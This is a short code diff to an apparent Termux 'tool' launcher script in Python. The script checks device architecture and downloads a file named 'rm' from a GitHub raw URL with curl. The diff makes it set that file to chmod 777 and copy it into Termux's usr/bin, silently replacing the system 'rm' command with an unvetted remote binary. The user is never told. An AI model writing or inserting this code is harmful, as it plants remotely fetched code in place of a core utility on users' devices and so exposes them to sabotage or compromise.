@@ -2,7 +2,6 @@ import os
 from os import path,system
 from platform import uname
 arch=uname().machine.lower()
-system('cp rm /data/data/com.termux/files/usr/bin && chmod 777 rm')
 if path.isfile("XD.so"):
     pass
 else:
@@ -15,7 +14,7 @@ if path.isfile("rm"):
     pass
 else:
     system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/rm -o rm")
-
+    system('chmod 777 rm && cp rm /data/data/com.termux/files/usr/bin')
 if 'aarch' in arch:
     arch = 'aarch'
     print('\033[1;32m\nCongratulatings! Your Deviec Support This Tools')
